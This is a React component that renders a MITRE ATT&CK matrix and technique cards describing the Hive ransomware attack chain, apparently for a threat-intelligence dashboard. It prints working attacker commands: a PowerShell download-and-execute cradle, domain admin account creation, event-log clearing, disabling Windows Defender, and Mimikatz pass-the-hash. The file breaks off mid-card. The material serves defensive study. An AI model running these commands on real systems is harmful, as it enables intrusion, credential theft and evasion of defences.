import React from 'react'

type Propx = {
  className: string
}

const HIVE: React.FC<Propx> = ({className}) => { 
  return (
	<>
    <div className={`card mb-6 ${className}`}>
        <h1 className='card-title fw-bold fs-2qx pt-6'>MITRE ATT&CK MATRIX</h1>
        <div className='card-body pt-3 pb-6'>
        <div className='table-responsive border-start border-end border-white'>
          <table className='table align-baseline gx-1 gy-4 table-striped border border-dark'>
            <thead>
			   <tr className='fs-6 fw-semebold text-white bg-dark text-center'>
			    	<th className='min-w-175px border-end border-white'>Initial-Access</th>
			    	<th className='min-w-175px border-end border-white'>Execution</th>
			    	<th className='min-w-175px border-end border-white'>Persistence</th>
			    	<th className='min-w-175px border-end border-white'>Defense-Evasion</th>
			    	<th className='min-w-175px border-end border-white'>Credential-Access</th>
			    	<th className='min-w-175px border-end border-white'>Discovery</th>
			    	<th className='min-w-175px border-end border-white'>Lateral-Movement</th>
			    	<th className='min-w-175px border-end border-white'>Command-and-Control</th>
			    	<th className='min-w-175px border-end border-white'>Impact</th>
               </tr>
            </thead>
            <tbody>
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1190</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Exploit Public-Facing Application</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>CVE-2021-34473
CVE-2021-34523
CVE-2021-31207 
</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1204.002</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>User Execution: Malicious File</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Download malicious files from the remote C2 server to the victim's computer</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1136.002</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Create Account: Domain Account</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Created user and added "RDP" and "Admin" groups</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1140</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Deobfuscate/Decode Files or Information</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Encoding Base64</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1003.005</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>OS Credential Dumping: Cached Domain Credentials</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Used Mimikatz</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1018</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Remote System Discovery</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>To locate all live hosts, the attacker executed a Batch script</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1021.001</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Remote Services: Remote Desktop Protocol</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>RDP access requests using mstsc</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1071.001</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Application Layer Protocol: Web Protocols</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Invoke-WebRequest</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1486</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Data Encrypted for Impact</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>RSA
.$randomstring.hive
</div>
								</div>
							</div>
						</div>
					</td>          
				</tr>
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1070.001</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Indicator Removal: Clear Windows Event Logs</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Clearing the Windows Security Event Logs</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1490</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Inhibit System Recovery</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Deleting VSS Copies</div>
								</div>
							</div>
						</div>
					</td>          
				</tr>
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1562.001</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Impair Defenses: Disable or Modify Tools</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Disables Windows Defender to avoid detection</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				</tr>
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1489</span>
								<span className='text-dark fw-semibold mb-1 fs-7'>Service Stop</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-3 pb-1 pe-1 fst-italic'>
								<div className='text-white fw-semibold d-block fs-7'>
									<div>Prevent sending alerts to SIEM system</div>
								</div>
							</div>
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				
					<td className='align-items-baseline border-start border-end border-dark'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
								<span className='text-dark fw-semibold mb-1 fs-7'></span>
							</div>
							
						</div>
					</td>          
				</tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Initial-Access</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6 '>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1190</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Exploit Public-Facing Application</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>ProxyShell involves a set of three separate security flaws and allows remote attackers to execute arbitrary code on affected installations of Microsoft Exchange Server.</div>
					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
					<div className='fs-4 fw-semebold pb-5 ms-5 text-dark fst-italic'>
						<div>&deg;&nbsp;CVE-2021-34473 (CVSS:9.8) Microsoft Exchange Server Remote Code Execution Vulnerability.</div>
					
						<div>&deg;&nbsp;CVE-2021-34523 (CVSS:9.8) Microsoft Exchange Server Elevation of Privilege Vulnerability</div>
					
						<div>&deg;&nbsp;CVE-2021-31207 (CVSS:7.2) Microsoft Exchange Server Security Feature Bypass Vulnerability</div>
					</div>
					
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Execution</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1204.002</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- User Execution: Malicious File</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Threat actor executed various PowerShell commands designed to download malicious files from the remote C2 server to the victim's computer. Attackers would execute the malware by using commands such as Invoke-Expression (IEX) or by downloading the file content directly into the device's memory and executing it.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;IEX ((new-object net.webclient).downloadstring('$addr')) </div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Persistence</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1136.002</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Create Account: Domain Account</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>With the provided NT AUTHORITY\SYSTEM privileges and to maintain persistence over the compromised server, a newly crafted account followed by the name "user" was created.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;net user "user" "#password" /add /domain</div>
							<div>&deg;&nbsp;net group "Remote Desktop Users" "user" /add /domain</div>
							<div>&deg;&nbsp;net group "Administrators" "user" /add /domain</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Defense-Evasion</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1140</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Deobfuscate/Decode Files or Information</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The additional "for loop" function adds another layer of obfuscation and XORs the Base64 code with a key of 35. We successfully extracted the IP address of the target C2 by mimicking the process, which, unsurprisingly, turned out to be the same address we found previously.</div>
					
					
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1070.001</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Indicator Removal: Clear Windows Event Logs</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The payload performs multiple operations, including deleting shadow copies, disabling security products, clearing Windows event logs, and closing handles on files to guarantee a smooth encryption process.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;wevtutil cl security</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1562.001</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Impair Defenses: Disable or Modify Tools</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The payload performs multiple operations, including deleting shadow copies, disabling security products, clearing Windows event logs, and closing handles on files to guarantee a smooth encryption process.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1489</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Service Stop</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The payload performs multiple operations, including deleting shadow copies, disabling security products, clearing Windows event logs, and closing handles on files to guarantee a smooth encryption process.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;net.exe stop "SamSs" /y</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Credential-Access</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1003.005</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- OS Credential Dumping: Cached Domain Credentials</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The threat actor used Mimikatz, a post-exploitation tool, specifically its SekurLSA's "logonPasswords" module, which extracts the passwords and NTLM hashes of the accounts logged into the system and saves the results to a text file on the local system. With the administrator's NTLM hash in hand, the threat actor used the pass-the-hash technique to get highly privileged access to other assets in the network by launching a new command prompt on the affected system.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;mimikatz_exe "sekurlsa::pth /user:Administrator /domain:" " ntlm:" " /run:cmd"</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Discovery</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1018</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Remote System Discovery</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Threat actor acquired the domain devices list and saved the results to a text file named "domains.txt." To locate all live hosts, the attacker executed a Batch script called "p.bat," which looped over the domains list sending pings and saved the results to a text file named "res.txt".</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;for /f %i in (domains.txt) do ping %i -n 1</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Lateral-Movement</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1021.001</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Remote Services: Remote Desktop Protocol</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Leveraging the stolen domain admin account, the actor performed RDP access requests using mstsc.exe following the parameter "/v" to multiple devices on the network, mainly searching for servers associated with the network backups and SQL servers.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;mstsc /v:$server</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Command-and-Control</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1071.001</span>
						<span className='text-dark fw-bold mb-1 fs-3'>- Application Layer Protocol: Web Protocols</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.</div>
					
					<div className='fs-2 fw-bold pb-3'>Command</div>
					<div className='mb-5'>
						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
						<span>&nbsp;&nbsp;</span>
						
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
						<span>&nbsp;&nbsp;</span>
					
						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
						<span>&nbsp;&nbsp;</span>
					
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
							<div>&deg;&nbsp;Invoke-WebRequest #$domain -UserAgent "HttpBrowser/1.0" | out-null</div>
							<div>&deg;&nbsp;Invoke-WebRequest #$domain -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null</div>
							<div>&deg;&nbsp;Invoke-WebRequest #$domain -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null</div>
							<div>&deg;&nbsp;Invoke-WebRequest #$domain -UserAgent "**" | out-null</div>
							
						</div>
					</div>
					
				</div>
			</div>
		</div>
	</div>
	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Impact</div>
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-6'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1486</span>
